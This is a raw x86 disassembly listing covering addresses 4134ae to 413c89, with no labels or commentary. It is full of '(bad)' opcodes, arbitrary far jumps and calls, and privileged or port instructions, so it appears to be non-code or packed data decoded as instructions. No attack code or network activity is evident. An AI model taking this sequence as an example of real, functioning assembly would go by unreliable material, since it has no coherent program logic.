  4134ae:	sahf   
  4134af:	test   BYTE PTR [edx+0x5],ch
  4134b2:	add    al,0x4c
  4134b4:	dec    edi
  4134b5:	mov    ds:0x3ffbf651,eax
  4134ba:	hlt    
  4134bb:	ss (bad) 
  4134bd:	sub    al,0xd1
  4134bf:	dec    ebx
  4134c0:	xchg   DWORD PTR [eax-0xd],ebp
  4134c3:	fwait
  4134c4:	jae    0x4134b5
  4134c6:	call   0x7ae3:0xdd15782a
  4134cd:	pop    esp
  4134ce:	or     DWORD PTR [eax+eax*8+0x4666825e],0xffffffe2
  4134d6:	add    DWORD PTR [edi],edi
  4134d8:	inc    edi
  4134d9:	outs   dx,DWORD PTR ds:[esi]
  4134da:	lea    edi,[esp+ebx*4-0x44]
  4134de:	pop    ebp
  4134df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134e0:	rcl    DWORD PTR [edi],0xe4
  4134e3:	inc    ebx
  4134e4:	mov    ch,0x5e
  4134e6:	add    eax,0x6f465c32
  4134eb:	ret    
  4134ec:	push   0x74
  4134ee:	mov    bh,0x25
  4134f0:	call   FWORD PTR [edx]
  4134f2:	icebp  
  4134f3:	xor    ch,ah
  4134f5:	loope  0x413559
  4134f7:	ins    BYTE PTR es:[edi],dx
  4134f8:	mov    edx,0xf6607e35
  4134fd:	fst    QWORD PTR [edi+0x2c]
  413500:	fistp  WORD PTR [eax+ebx*4-0x6c]
  413504:	clc    
  413505:	stc    
  413506:	adc    eax,0x2872fcf6
  41350b:	ins    DWORD PTR es:[edi],dx
  41350c:	les    ebp,FWORD PTR [edx]
  41350e:	xchg   esi,eax
  41350f:	jo     0x4134dd
  413511:	xchg   ebp,eax
  413512:	jmp    0x41353a
  413514:	cmp    eax,0xe9f41df
  413519:	mov    dl,0xd7
  41351b:	cmp    ah,BYTE PTR [edx+0x3c]
  41351e:	mov    al,0x6d
  413520:	pop    ebx
  413521:	in     eax,0x9f
  413523:	mov    ebx,eax
  413525:	xchg   ebx,eax
  413526:	xchg   ebx,eax
  413527:	pop    ss
  413528:	ins    DWORD PTR es:[edi],dx
  413529:	pop    eax
  41352a:	cmp    eax,0x800e67bc
  41352f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413530:	call   0x62a0:0x7a5ff728
  413537:	add    eax,0xef1bd481
  41353c:	push   0xffffffe1
  41353e:	(bad)  
  41353f:	test   eax,0x266da0e8
  413544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413545:	lods   eax,DWORD PTR ds:[esi]
  413546:	mov    esp,0x964b91af
  41354b:	add    al,BYTE PTR [edi+0x137bbd33]
  413551:	ss aas 
  413553:	lock xor BYTE PTR [esi],al
  413556:	jecxz  0x41352e
  413558:	std    
  413559:	add    eax,0xcc8cf3c3
  41355e:	adc    ah,dl
  413560:	xor    al,0xc7
  413562:	push   ss
  413563:	xchg   ecx,eax
  413564:	add    DWORD PTR [bx+si-0x11],edx
  413568:	dec    esp
  413569:	test   al,0x39
  41356b:	mov    esp,ecx
  41356d:	mov    WORD PTR [ebx-0x69],?
  413570:	cmc    
  413571:	lods   eax,DWORD PTR ds:[esi]
  413572:	jno    0x41359e
  413574:	(bad)  
  413575:	loopne 0x4135dc
  413577:	sbb    ah,dl
  413579:	test   eax,0x891397f1
  41357e:	cdq    
  41357f:	test   al,0x3a
  413581:	ds mov esp,0xa05011e4
  413587:	lock data16 jl 0x41351a
  41358b:	(bad)  
  41358d:	jp     0x4135d4
  41358f:	div    ebx
  413591:	mov    esi,0x5e0c68
  413596:	xlat   BYTE PTR ds:[ebx]
  413597:	loop   0x413614
  413599:	push   cs
  41359a:	xchg   ecx,eax
  41359b:	leave  
  41359c:	inc    ecx
  41359d:	repnz xor bh,BYTE PTR [ecx-0x6ccab793]
  4135a4:	adc    al,0x64
  4135a6:	popa   
  4135a7:	mov    edx,0x62107e03
  4135ac:	int3   
  4135ad:	daa    
  4135ae:	pop    ebp
  4135af:	xor    al,0x50
  4135b1:	lds    edi,FWORD PTR [ebx-0x76a49ecd]
  4135b7:	std    
  4135b8:	xchg   edx,eax
  4135b9:	xor    eax,0xf67fb7f0
  4135be:	jp     0x41355d
  4135c0:	fwait
  4135c1:	rcr    BYTE PTR [esi-0x40],cl
  4135c4:	out    dx,eax
  4135c5:	xor    BYTE PTR [ebx+ecx*2-0x6f],bh
  4135c9:	adc    ah,BYTE PTR [edx-0xcaeb162]
  4135cf:	mov    DWORD PTR [edi],ebp
  4135d1:	xor    al,0xd
  4135d3:	(bad)  
  4135d4:	std    
  4135d5:	xor    al,0x9
  4135d7:	(bad)  
  4135d8:	sub    eax,0x492dc92f
  4135dd:	inc    edi
  4135de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135df:	cmp    ecx,DWORD PTR [ebx]
  4135e1:	sub    al,dh
  4135e3:	push   0x313b6545
  4135e8:	mov    esi,0x229bef91
  4135ed:	and    eax,0x920e536f
  4135f2:	cli    
  4135f3:	xlat   BYTE PTR ds:[ebx]
  4135f4:	stos   DWORD PTR es:[edi],eax
  4135f5:	(bad)  
  4135f6:	xchg   esi,eax
  4135f7:	mov    ch,0x9b
  4135f9:	ret    
  4135fa:	dec    esi
  4135fb:	dec    ebp
  4135fc:	retf   0xbd35
  4135ff:	mov    esp,0xa92e951a
  413604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413605:	jg     0x4135be
  413607:	repz addr16 or al,0xb6
  41360b:	sub    al,0xe
  41360d:	jo     0x4135b6
  41360f:	arpl   WORD PTR [edi],sp
  413611:	sub    bh,BYTE PTR [edx-0x77]
  413614:	imul   esp,DWORD PTR [ebx],0x3d
  413617:	inc    DWORD PTR [esp+ebp*2+0x4820b4de]
  41361e:	jmp    0x592a:0xb0bfe8b6
  413625:	out    0x83,eax
  413627:	cmp    esp,DWORD PTR [ecx+0x63e48724]
  41362d:	(bad)  
  41362e:	out    dx,eax
  41362f:	jae    0x41369c
  413631:	iret   
  413632:	mov    edx,0x3d924a54
  413637:	inc    DWORD PTR [ebp+0x1]
  41363a:	adc    al,0xb6
  41363c:	inc    eax
  41363d:	stos   BYTE PTR es:[edi],al
  41363e:	cli    
  41363f:	mov    ecx,0x3b2f0e43
  413644:	mov    ds:0xb38cc43b,al
  413649:	sbb    DWORD PTR [ebp+0x2dd7750b],ecx
  41364f:	xor    DWORD PTR [edi-0x1f],0x399168ef
  413656:	sbb    BYTE PTR [ebx+0x7ee75c4],0xde
  41365d:	and    esp,ebp
  41365f:	scas   al,BYTE PTR es:[edi]
  413660:	sub    eax,0x599723ea
  413665:	int3   
  413666:	push   0x52
  413668:	stc    
  413669:	jl     0x4136ad
  41366b:	scas   eax,DWORD PTR es:[edi]
  41366c:	out    0xd6,al
  41366e:	dec    ebp
  41366f:	stos   BYTE PTR es:[edi],al
  413670:	neg    BYTE PTR [esi+0x3c]
  413673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413674:	gs into 
  413676:	cmp    BYTE PTR [eax+ecx*4+0x4d7e3e43],bl
  41367d:	and    eax,0xba8ef16f
  413682:	scas   al,BYTE PTR es:[edi]
  413683:	leave  
  413684:	and    BYTE PTR [ecx+ebx*4],ah
  413687:	sahf   
  413688:	push   esp
  413689:	pop    ebx
  41368a:	bound  esi,QWORD PTR [ebx-0x7c]
  41368d:	sbb    esi,0xffffff82
  413690:	fist   DWORD PTR [esi+ebx*1+0x5da27c1b]
  413697:	mov    cl,0x4a
  413699:	mov    dl,0x11
  41369b:	(bad)  
  41369c:	int    0xbe
  41369e:	push   esp
  41369f:	add    DWORD PTR [edi-0x336c51b0],0xfffffff3
  4136a6:	and    al,0xf0
  4136a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136a9:	jg     0x41365e
  4136ab:	mov    eax,0xc57086e3
  4136b0:	inc    esp
  4136b1:	lahf   
  4136b2:	inc    esi
  4136b3:	mov    eax,ds
  4136b5:	inc    edi
  4136b6:	jbe    0x413652
  4136b8:	jmp    0x15db:0xe8fbc30c
  4136bf:	or     BYTE PTR [ebp-0x272c8ac7],dl
  4136c5:	mov    ds:0x4657c77a,eax
  4136ca:	add    eax,0xa3a219e4
  4136cf:	push   0x60d77ed5
  4136d4:	in     al,0xa3
  4136d6:	sub    dh,bh
  4136d8:	mov    al,0xa2
  4136da:	(bad)  
  4136db:	jmp    0xad811d8e
  4136e0:	jmp    0xca27:0x9525e16d
  4136e7:	xchg   edi,eax
  4136e8:	repz mov ah,0xd7
  4136eb:	call   0x6750:0xb8f1be50
  4136f2:	idiv   BYTE PTR [eax]
  4136f4:	mov    al,0xf2
  4136f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136f7:	aas    
  4136f8:	lahf   
  4136f9:	sub    al,0xdb
  4136fb:	int    0x3f
  4136fd:	mov    ds:0x390c9b84,eax
  413702:	mov    bl,BYTE PTR [eax-0x2bfc9bdf]
  413708:	pop    ebx
  413709:	sub    eax,DWORD PTR [edx+0x224f97eb]
  41370f:	mov    ah,0x21
  413711:	dec    esp
  413712:	xchg   BYTE PTR [eax-0x41e65e3f],ch
  413718:	in     eax,dx
  413719:	inc    ebx
  41371a:	cdq    
  41371b:	inc    ecx
  41371c:	ins    BYTE PTR es:[edi],dx
  41371d:	push   ss
  41371e:	mov    ebx,0xc5ce7f1e
  413723:	shl    dl,cl
  413725:	test   eax,0xe7498e76
  41372a:	jmp    0x413745
  41372c:	xchg   BYTE PTR [ebx+0x399b97af],ah
  413732:	loope  0x4136fb
  413734:	cmpps  xmm6,xmm6,0x33
  413738:	lods   al,BYTE PTR ds:[esi]
  413739:	add    esi,DWORD PTR [edi-0x244fc247]
  41373f:	cs and al,0xd
  413742:	jbe    0x413724
  413744:	add    DWORD PTR [edi],eax
  413746:	inc    ecx
  413747:	dec    ebx
  413748:	mov    ebx,0xf1c63b14
  41374d:	mov    ds:0x50df18b8,al
  413752:	mov    ch,0x5d
  413754:	pop    edx
  413755:	dec    ebx
  413756:	or     DWORD PTR [ecx],esi
  413758:	jne    0x4137cd
  41375a:	(bad)  
  41375c:	jmp    0x4137aa
  41375e:	and    eax,ecx
  413760:	or     dl,0xd5
  413763:	adc    DWORD PTR [ebp+0x60c52b29],esp
  413769:	mov    al,ds:0xcd3766c1
  41376e:	clc    
  41376f:	pop    es
  413770:	jg     0x41370a
  413772:	xchg   ebp,eax
  413773:	xchg   ecx,eax
  413774:	jmp    0x115c:0x7e6299e1
  41377b:	inc    ebx
  41377c:	fcomp  st(3)
  41377e:	push   cs
  41377f:	in     al,0x1d
  413781:	jb     0x4137d1
  413783:	jbe    0x413761
  413785:	mov    dl,0x56
  413787:	xchg   ebx,eax
  413788:	je     0x4137de
  41378a:	ret    
  41378b:	xchg   DWORD PTR [bp+si-0x77],esp
  41378f:	ja     0x4137f4
  413791:	sub    esi,ebp
  413793:	jge    0x4137d4
  413795:	pop    ss
  413796:	aaa    
  413797:	adc    ch,BYTE PTR [ebx]
  413799:	imul   DWORD PTR [ebx+0x622de9f4]
  41379f:	mov    ch,0xa0
  4137a1:	cmc    
  4137a2:	or     DWORD PTR [ebp-0x59],ecx
  4137a5:	shl    esi,cl
  4137a7:	mov    DWORD PTR [esi+0x7c],edi
  4137aa:	mov    eax,0xa3fe7bc6
  4137af:	xchg   DWORD PTR [ebx+edx*1+0x3e4cfca4],edi
  4137b6:	and    BYTE PTR [ecx-0x268b0201],0x54
  4137bd:	jecxz  0x4137d1
  4137bf:	js     0x4137c1
  4137c1:	sub    eax,0x7b3e1d46
  4137c6:	pop    edi
  4137c7:	imul   ebp,ebx,0xffffffe8
  4137ca:	mov    ebx,0xa9ac75d7
  4137cf:	sbb    bh,BYTE PTR [edx-0xe]
  4137d2:	jmp    0x159c0160
  4137d7:	add    al,BYTE PTR [edi-0x6b1d03d4]
  4137dd:	les    esi,FWORD PTR [esp+ebp*2-0x48e0251c]
  4137e4:	or     dl,ah
  4137e6:	jnp    0x41385e
  4137e8:	fmulp  st(4),st
  4137ea:	push   ebp
  4137eb:	sub    dh,ch
  4137ed:	loop   0x413858
  4137ef:	nop
  4137f0:	lds    edx,FWORD PTR [esp+ebx*8]
  4137f3:	add    eax,0xec8f1bb3
  4137f8:	mov    eax,ds:0x417f9ae4
  4137fd:	inc    esi
  4137fe:	dec    esp
  4137ff:	add    DWORD PTR [edi-0x2b],0xa9e4e575
  413806:	inc    edi
  413807:	jnp    0x413844
  413809:	mov    dh,0xd1
  41380b:	cmp    BYTE PTR [edx+0x12256830],0x93
  413812:	aaa    
  413813:	out    0xb,eax
  413815:	mov    ebp,0xdbb92cda
  41381a:	gs sbb eax,0x51907d1a
  413820:	xchg   ecx,eax
  413821:	or     eax,0xfdf06946
  413826:	into   
  413827:	cs (bad) 
  413829:	(bad)  
  41382a:	sbb    eax,edx
  41382c:	js     0x41383c
  41382e:	div    esi
  413830:	int3   
  413831:	cmp    eax,DWORD PTR [eax]
  413833:	and    dl,cl
  413835:	xor    eax,0x415068d4
  41383a:	pop    ds
  41383b:	test   al,0xff
  41383d:	popf   
  41383e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41383f:	xor    DWORD PTR [esi-0x36],esi
  413842:	xchg   eax,edi
  413844:	dec    edi
  413845:	push   es
  413846:	mov    WORD PTR [ebp+0x1a429dba],fs
  41384c:	sbb    esi,ebp
  41384e:	sub    BYTE PTR [edx-0x1e],ch
  413851:	push   ebp
  413852:	add    cl,BYTE PTR [edi]
  413854:	pusha  
  413855:	scas   eax,DWORD PTR es:[edi]
  413856:	cmp    cl,BYTE PTR [ebx-0x3fc264ab]
  41385c:	scas   al,BYTE PTR es:[edi]
  41385d:	test   eax,0x7c6ba003
  413862:	pop    edx
  413863:	inc    eax
  413864:	and    ecx,DWORD PTR [edx]
  413866:	or     DWORD PTR [esi],ecx
  413868:	mov    WORD PTR [esi+0x109cdec9],cs
  41386e:	jle    0x4138bb
  413870:	mov    BYTE PTR [esi+0x20cf438b],dl
  413876:	iret   
  413877:	push   eax
  413878:	(bad)  
  413879:	mov    esp,0x13135f32
  41387e:	repnz mul BYTE PTR [esi]
  413881:	(bad)  
  413882:	in     al,0x4d
  413884:	jae    0x41387c
  413886:	xchg   edx,eax
  413887:	pop    ebx
  413888:	inc    ebp
  413889:	xchg   BYTE PTR [ecx+0x4bc53b5b],bl
  41388f:	hlt    
  413890:	rcr    BYTE PTR [bp+di+0x1267],0x6c
  413896:	test   DWORD PTR [eax],ecx
  413898:	test   BYTE PTR [edi-0x6a],ch
  41389b:	repz pop ss
  41389d:	xchg   ecx,eax
  41389e:	xchg   esi,eax
  41389f:	adc    dh,al
  4138a1:	add    esi,DWORD PTR [edi-0x7d]
  4138a4:	int    0x1
  4138a6:	cmp    BYTE PTR [edx-0x67],ah
  4138a9:	inc    esi
  4138aa:	jnp    0x4138ed
  4138ac:	js     0x4138bd
  4138ae:	sbb    dl,bh
  4138b0:	bound  esp,QWORD PTR [ebx-0x3155045f]
  4138b6:	pop    ss
  4138b7:	outs   dx,DWORD PTR ds:[esi]
  4138b8:	mov    edi,0x6f61f1e0
  4138bd:	push   eax
  4138be:	or     al,0x27
  4138c0:	jecxz  0x4138b4
  4138c2:	mov    ch,0x27
  4138c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c5:	mov    bl,0x32
  4138c7:	mov    eax,ds:0x6cc9aee0
  4138cc:	into   
  4138cd:	sub    eax,0x9e92f0ba
  4138d2:	or     al,BYTE PTR [edx]
  4138d4:	xor    BYTE PTR [ebx-0x76d7ba65],cl
  4138da:	lods   al,BYTE PTR ds:[esi]
  4138db:	call   0xb503b6bd
  4138e0:	dec    ebx
  4138e1:	fcmovu st,st(6)
  4138e3:	sti    
  4138e4:	inc    eax
  4138e5:	pop    edx
  4138e6:	and    edx,DWORD PTR [ebx-0x3a]
  4138e9:	mov    ah,0xbf
  4138eb:	xor    eax,0x5c875ec6
  4138f0:	(bad)
  4138f3:	pop    ds
  4138f4:	sbb    eax,0xb255cdaa
  4138f9:	ja     0x41393e
  4138fb:	mov    edi,0x65e2d86e
  413900:	jns    0x413973
  413902:	sbb    esp,DWORD PTR [ebx+0x3d]
  413905:	in     eax,dx
  413906:	ret    
  413907:	xchg   esp,eax
  413908:	enter  0x59af,0x79
  41390c:	or     BYTE PTR [edx+0x6d21c18],dl
  413912:	adc    cl,BYTE PTR [edx+ebx*8+0x49]
  413916:	pop    edi
  413917:	scas   al,BYTE PTR es:[edi]
  413918:	shr    BYTE PTR [ecx+0x3c],0x1
  41391c:	out    0x9,al
  41391e:	add    BYTE PTR [eax+0x44],bh
  413921:	enter  0xca28,0x18
  413925:	das    
  413926:	dec    ecx
  413927:	sub    ebx,eax
  413929:	add    dh,BYTE PTR [edi+0x4e]
  41392c:	test   dh,ah
  41392e:	jb     0x41395c
  413930:	mov    ds:0x27775dae,al
  413935:	sub    DWORD PTR [ebx+0x6d],ebp
  413938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413939:	call   0xc4a8e15f
  41393e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41393f:	jmp    0xe035803a
  413944:	cmp    BYTE PTR [esi-0x77f8c22b],0xf0
  41394b:	imul   al
  41394d:	jnp    0x4138f2
  41394f:	xor    ecx,DWORD PTR [ebp+ebx*4+0x76e2103c]
  413956:	stos   DWORD PTR es:[edi],eax
  413957:	add    eax,0xb8f7e01a
  41395c:	js     0x4138f1
  41395e:	icebp  
  41395f:	shr    DWORD PTR [edx],1
  413961:	std    
  413962:	(bad)  
  413963:	ja     0x4139cc
  413965:	dec    esi
  413966:	inc    ebp
  413967:	inc    edx
  413968:	test   eax,0x7ebb9b4a
  41396d:	inc    edx
  41396e:	aad    0x97
  413970:	hlt    
  413971:	int    0x31
  413973:	scas   eax,DWORD PTR es:[edi]
  413974:	stos   BYTE PTR es:[edi],al
  413975:	pop    esi
  413976:	mov    ss,WORD PTR [edi]
  413978:	mov    ds,WORD PTR [eax-0x13]
  41397b:	bound  ecx,QWORD PTR [ebp+eiz*2+0x7d0aae92]
  413982:	push   ds
  413983:	xchg   ecx,eax
  413984:	and    eax,0x7eea8b3f
  413989:	pop    ebx
  41398a:	dec    esp
  41398b:	adc    eax,0x576cc059
  413990:	xchg   DWORD PTR [esi+0x160c87c],esp
  413996:	fwait
  413997:	dec    ecx
  413998:	pop    ebp
  413999:	std    
  41399a:	int3   
  41399b:	xchg   esp,eax
  41399c:	or     ah,bh
  41399e:	nop
  41399f:	and    esp,ecx
  4139a1:	es jge 0x4139e5
  4139a4:	lahf   
  4139a5:	add    bl,BYTE PTR gs:[ebx]
  4139a8:	stc    
  4139a9:	jl     0x413931
  4139ab:	add    DWORD PTR [edi],esp
  4139ad:	inc    ebx
  4139ae:	fnstsw WORD PTR [ebx-0x10fe3447]
  4139b4:	jno    0x4139c2
  4139b6:	mov    gs,WORD PTR [ebp+0x147e2137]
  4139bc:	pop    ebx
  4139bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139be:	outs   dx,DWORD PTR ds:[esi]
  4139bf:	jle    0x413980
  4139c1:	mov    ah,0xb8
  4139c3:	cmp    edi,esp
  4139c5:	aam    0xfc
  4139c7:	int3   
  4139c8:	fs stc 
  4139ca:	test   al,0xd8
  4139cc:	ins    BYTE PTR es:[edi],dx
  4139cd:	ins    BYTE PTR es:[edi],dx
  4139ce:	mov    al,0x40
  4139d0:	(bad)  [ecx-0x582d3880]
  4139d6:	sbb    ebx,DWORD PTR [edi+0xd]
  4139d9:	ss (bad) 
  4139db:	sub    eax,0xf75e2706
  4139e0:	(bad)  
  4139e1:	sub    eax,0xd793674b
  4139e6:	add    DWORD PTR [ebx-0x121bd309],edx
  4139ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ed:	mov    esi,0x150a5ea2
  4139f2:	test   eax,0x6739453b
  4139f7:	add    esp,esp
  4139f9:	sub    DWORD PTR [esi+0x3effccb6],ecx
  4139ff:	push   eax
  413a00:	add    ch,cl
  413a02:	or     BYTE PTR [ebx],ah
  413a04:	sub    esp,edx
  413a06:	jae    0x413a65
  413a08:	rol    BYTE PTR [eax-0x34],cl
  413a0b:	dec    eax
  413a0c:	pop    esp
  413a0d:	push   0xdd8003a1
  413a12:	loop   0x4139bf
  413a14:	fdivp  st(4),st
  413a16:	mov    edx,0x30d11eac
  413a1b:	and    ebx,ebx
  413a1d:	bound  edx,QWORD PTR [ecx]
  413a1f:	or     bh,BYTE PTR [edx-0x47a8df87]
  413a25:	and    al,0xf
  413a27:	mov    ch,0x20
  413a29:	(bad)  
  413a2a:	adc    bh,ch
  413a2c:	jg     0x4139cf
  413a2e:	mov    ds:0x657d25f4,al
  413a33:	push   es
  413a34:	aad    0x1
  413a36:	or     al,BYTE PTR [edx+edi*2]
  413a39:	ret    0x1913
  413a3c:	sub    DWORD PTR [edi],ecx
  413a3e:	dec    DWORD PTR [ebx+0x5892ecd6]
  413a44:	jno    0x413abd
  413a46:	dec    ebx
  413a47:	push   cs
  413a48:	dec    ebx
  413a49:	cmp    ebp,DWORD PTR [ebp-0x355b6046]
  413a4f:	ss retf 0x9bbf
  413a53:	jecxz  0x413a56
  413a55:	sub    BYTE PTR [edi-0x5b],al
  413a58:	mov    esi,0xc9e04154
  413a5d:	push   0x3721919e
  413a62:	mov    bl,0xe9
  413a64:	mov    BYTE PTR [eax+0x42],0xe6
  413a68:	mov    DWORD PTR [ecx+0x3b],edi
  413a6b:	add    dh,BYTE PTR [eax]
  413a6d:	lock sahf 
  413a6f:	idiv   BYTE PTR ds:0x9dae5627
  413a75:	adc    DWORD PTR [eax-0x70cf83d],edi
  413a7b:	in     eax,0xa8
  413a7d:	test   BYTE PTR [edi],dh
  413a7f:	or     BYTE PTR [edi+ebp*8-0x51],ah
  413a83:	inc    ebx
  413a84:	jge    0x413a1a
  413a86:	call   0x702d5c7d
  413a8b:	adc    DWORD PTR [ebx],edx
  413a8d:	iret   
  413a8e:	aas    
  413a8f:	nop
  413a90:	xchg   ebp,eax
  413a91:	xor    BYTE PTR [edi+0x30],dh
  413a94:	mov    WORD PTR [esi],cs
  413a96:	mov    ds:0x52d14e08,eax
  413a9b:	sbb    eax,0x6799b4cc
  413aa0:	scas   eax,DWORD PTR es:[edi]
  413aa1:	loop   0x413ad7
  413aa3:	push   ebx
  413aa4:	and    cl,BYTE PTR ds:[eax]
  413aa7:	xor    eax,0xfbe7c214
  413aac:	js     0x413aaf
  413aae:	inc    ebx
  413aaf:	fst    DWORD PTR [ebp+0x4eca208a]
  413ab5:	cli    
  413ab6:	adc    al,0xe2
  413ab8:	fwait
  413ab9:	mov    edx,0x4176399b
  413abe:	dec    edx
  413abf:	imul   edi,DWORD PTR [ecx+0x6f],0xffffffda
  413ac3:	pusha  
  413ac4:	and    BYTE PTR [edi],ch
  413ac6:	add    al,0x42
  413ac8:	or     eax,0x38de1713
  413acd:	stc    
  413ace:	ds mov bl,0x4d
  413ad1:	sbb    edi,DWORD PTR [eax+0x2c032d19]
  413ad7:	sub    eax,0x2b87de81
  413adc:	(bad)  
  413add:	cld    
  413ade:	sahf   
  413adf:	or     BYTE PTR [edi-0x5c],dh
  413ae2:	pop    ss
  413ae3:	ficom  WORD PTR [esi]
  413ae5:	jb     0x413aad
  413ae7:	or     BYTE PTR [esi+0x5c943bd1],dh
  413aed:	call   0x500df7b5
  413af2:	inc    ebx
  413af3:	test   DWORD PTR [ebp-0x10],0xb5fae2d6
  413afa:	scas   eax,DWORD PTR es:[edi]
  413afb:	ds push es
  413afd:	into   
  413afe:	out    dx,eax
  413aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b00:	and    al,0x4a
  413b02:	jb     0x413a9c
  413b04:	mov    esp,0x114b6858
  413b09:	jle    0x413aaa
  413b0b:	adc    eax,0xadf15d3d
  413b10:	(bad)  
  413b11:	pop    esp
  413b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b13:	mov    BYTE PTR [ecx+0x67],ah
  413b16:	and    DWORD PTR [esi],edi
  413b18:	xchg   ch,dl
  413b1a:	push   edi
  413b1b:	movaps xmm0,xmm1
  413b1e:	mov    ds:0x74ad9852,al
  413b23:	xchg   edi,eax
  413b24:	icebp  
  413b25:	mov    ds:0x1e0a4da8,al
  413b2a:	rcr    BYTE PTR [eax+0x1e],1
  413b2d:	loopne 0x413aef
  413b2f:	dec    eax
  413b30:	hlt    
  413b31:	out    0x19,al
  413b33:	ret    
  413b34:	sub    al,0xc3
  413b36:	jne    0x413b55
  413b38:	adc    DWORD PTR [ebp-0x52],edx
  413b3b:	in     eax,dx
  413b3c:	push   ds
  413b3d:	sub    dh,BYTE PTR [eax+0x44]
  413b40:	dec    ebx
  413b41:	stos   DWORD PTR es:[edi],eax
  413b42:	dec    edi
  413b43:	jp     0x413b9f
  413b45:	in     eax,dx
  413b46:	jnp    0x413aea
  413b48:	inc    ebp
  413b49:	inc    ecx
  413b4a:	jg     0x413bc8
  413b4c:	das    
  413b4d:	cmp    al,0xcc
  413b4f:	rcr    DWORD PTR [edi+0x2ede8b1d],1
  413b55:	adc    DWORD PTR [ecx-0x64],edx
  413b58:	pop    ds
  413b59:	(bad)  
  413b5a:	cwde   
  413b5b:	jnp    0x413aed
  413b5d:	pop    ss
  413b5e:	sahf   
  413b5f:	add    eax,0x5de5efec
  413b64:	inc    esp
  413b65:	inc    ecx
  413b66:	or     eax,0xc58c31ac
  413b6b:	icebp  
  413b6c:	mov    BYTE PTR [eax],bl
  413b6e:	lock je 0x413bac
  413b71:	dec    esp
  413b72:	fld    QWORD PTR [edi-0x5b]
  413b75:	cld    
  413b76:	adc    eax,0xa9ab4573
  413b7b:	sub    al,0xc6
  413b7d:	fcom   DWORD PTR [edi+edx*8-0xb]
  413b81:	xlat   BYTE PTR ds:[ebx]
  413b82:	add    al,ch
  413b84:	push   ebp
  413b85:	cmp    BYTE PTR [eax],0x0
  413b88:	and    ebx,ebx
  413b8a:	aam    0x84
  413b8c:	aaa    
  413b8d:	mov    ecx,0x42f30f5d
  413b92:	xor    ebp,DWORD PTR [eax]
  413b94:	adc    DWORD PTR [edi+0x7e],ebp
  413b97:	call   0x7682:0x7179ae10
  413b9e:	mov    ds:0x46af0e89,eax
  413ba3:	fld    DWORD PTR [edx]
  413ba5:	xchg   edi,eax
  413ba6:	jns    0x413bdc
  413ba8:	mov    bl,0x5e
  413baa:	sub    eax,0x3ec73efc
  413baf:	leave  
  413bb0:	in     eax,dx
  413bb1:	jecxz  0x413bd0
  413bb3:	mov    cl,0x56
  413bb5:	scas   eax,DWORD PTR es:[edi]
  413bb6:	cmp    eax,0xb77bc297
  413bbb:	adc    dh,BYTE PTR [esi]
  413bbd:	inc    eax
  413bbf:	enter  0x5746,0x31
  413bc3:	add    al,0x81
  413bc5:	(bad)  
  413bc6:	mov    al,0x2f
  413bc8:	pop    esp
  413bc9:	sbb    eax,0x24d1c312
  413bce:	and    ecx,0xc
  413bd1:	push   ebx
  413bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd3:	inc    esp
  413bd4:	lods   eax,DWORD PTR ds:[esi]
  413bd5:	mov    al,ds:0xe30a0c42
  413bda:	sahf   
  413bdb:	lds    edi,FWORD PTR [ebp-0x7470ae30]
  413be1:	mov    eax,0xb151c06b
  413be6:	adc    eax,0x7da2c7cd
  413beb:	add    ecx,DWORD PTR [esi]
  413bed:	lahf   
  413bee:	inc    ecx
  413bef:	dec    esp
  413bf0:	scas   eax,DWORD PTR es:[edi]
  413bf1:	mov    DWORD PTR [edx],ebx
  413bf3:	les    ebp,FWORD PTR [edi-0x3503b258]
  413bf9:	std    
  413bfa:	mov    edx,esp
  413bfc:	(bad)  [ebx+0x0]
  413bff:	(bad)  
  413c01:	jecxz  0x413bfa
  413c03:	cmp    BYTE PTR [ecx+0x6faa3fa1],dh
  413c09:	dec    edi
  413c0a:	je     0x413bb8
  413c0c:	adc    esp,esi
  413c0e:	pop    ss
  413c0f:	ret    
  413c10:	push   0x99565362
  413c15:	arpl   WORD PTR [ebx+0x667d86de],bp
  413c1b:	out    dx,eax
  413c1c:	xor    bl,BYTE PTR [ebx]
  413c1e:	add    DWORD PTR [ebp+0x72],edi
  413c21:	mov    ds:0x96eb57c5,eax
  413c26:	fimul  DWORD PTR [eax-0x63eb782b]
  413c2c:	(bad)  
  413c2d:	jae    0x413c4c
  413c2f:	mov    ds:0x16bcae62,eax
  413c34:	dec    ebx
  413c35:	mov    WORD PTR [edx+ebp*4],gs
  413c38:	jg     0x413c30
  413c3a:	nop
  413c3b:	sbb    eax,0x9e78e7f8
  413c40:	arpl   WORD PTR [edi],si
  413c42:	push   0x62
  413c44:	daa    
  413c45:	setl   BYTE PTR [ebx+0x7aa176c3]
  413c4c:	call   0x4f9d:0xa720659f
  413c53:	or     DWORD PTR [esi+0x8],eax
  413c56:	in     al,0x72
  413c58:	adc    al,0xeb
  413c5a:	cmp    ebx,DWORD PTR ds:0xfe0fc5af
  413c60:	lods   al,BYTE PTR ds:[esi]
  413c61:	fwait
  413c62:	test   ecx,ebx
  413c64:	mov    eax,0x87bdf3c3
  413c69:	and    DWORD PTR [esi-0x7b4c0df8],ebx
  413c6f:	nop
  413c70:	aam    0x67
  413c72:	mov    ah,0x5d
  413c74:	ror    DWORD PTR [eax+0x1e],0xfd
  413c78:	xchg   ebp,eax
  413c79:	mov    ah,0x5d
  413c7b:	mov    edi,0x8da88e20
  413c80:	inc    ebp
  413c81:	adc    al,0x4f
  413c83:	or     esp,edx
  413c85:	push   edx
  413c86:	push   ss
  413c87:	test   al,0xf1
  413c89:	pop    edx
